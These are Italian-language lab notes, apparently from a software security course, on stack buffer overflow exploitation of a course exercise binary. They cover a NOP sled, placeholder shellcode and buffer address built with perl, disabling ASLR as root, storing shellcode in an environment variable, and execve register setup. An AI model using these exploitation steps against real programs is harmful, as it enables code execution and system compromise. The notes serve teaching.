# Su 'candy'
Il messaggio non è in .data in quanto sarebbe allocato in memoria
dove non voglio -> voglio l'eseguibile position-independent

# Per testate il codice
Creato il file test.c
Per vedere se l'array è giusto, confronto l'output di
hexdump -d candy.o
e
echo -e "ARRAY_SHELLCODE" | hexdump -C

# Come fare quindi?
Creo il candy vero con
echo -e -n "ARRAY_SHELLCODE" > exploit
togliendo l'ultimo \x0a (newline)
quindi
gdb ./exec-to-attack
ed in gdb
b correct-line
r < exploit

# Attacchiamo l'esercizio 5.4 della scorsa volta
Usando nella cartella 'lesson_3'
python -c "print 'a'*88" | ./ex_5.4_insecure
abbiamo un segfault -> sovrascriviamo con 88 byte
Codice 'noop' = 0x90
La lunghezza di 'exploit' è di 36 bytes
Devo lasciare abbastanza spazio per passare alla gets il puntatore del buffer
Quindi 88 - 36 - 4 = 48
Quindi stampo 48 'noop' seguito dallo shellcode verificato e dal puntatore a buf!
Per avere l'indirizzo di buf statico, necessito di disabilitare la randomizzazione con
echo 0 > /proc/sys/kernel/randomize_va_space
in una shell di root
Quindi, creo l'eseguibile con
perl -e 'print "\x90"x48 . "ARRAY_SHELLCODE" . "INDIRIZZO_BUF"' > exploit
Ma... Errore! Segfault
Controllo caricando in gdb con
gdb execname core
dopo aver eseguito
ulimit -c unlimited
e
cat exploit | exec-name
Vedo che non ho sovrascritto eip ma ebp!
Aggiungo altri 4 bytes di noop
perl -e 'print "\x90"x52 . "ARRAY_SHELLCODE" . "INDIRIZZO_BUF"' > exploit

# Nuovo attacco!
Creo una nuova variabile
export MY_ATTACK=`cat exploit_env`
dopo aver creato l'env exploit come
perl -e 'print "ARRAY_SHELLCODE"' > exploit_env
Quindi, dopo aver trovato l'indirizzo della variabile con
getenvaddr MY_ATTACK
attacco l'eseguibile con
perl -e 'print "A"x88 . "MY_ATTACK_ADDRESS"' | vulnerable-exec

# In generale
1. Scrivi l'exploit in C
2. Convertire l'exploit in assembler
3. Convertire l'exploit in binario
4. Testare il binario
5. ATTACCAH
# Creare una shell in assembler
eax = 0xb
ebx = indirizzo del programma
ecx =
edx = indirizzo dell'ambiente

# Per disassemblare
objdump -d ELF

# Note!
Iniettando il candy shell, 'gets' sminchia lo standard input.
Per sistemare, si fa:
(perl -e 'print JUNK . VAR_ADDRESS'; cat) | ./insecure_executable
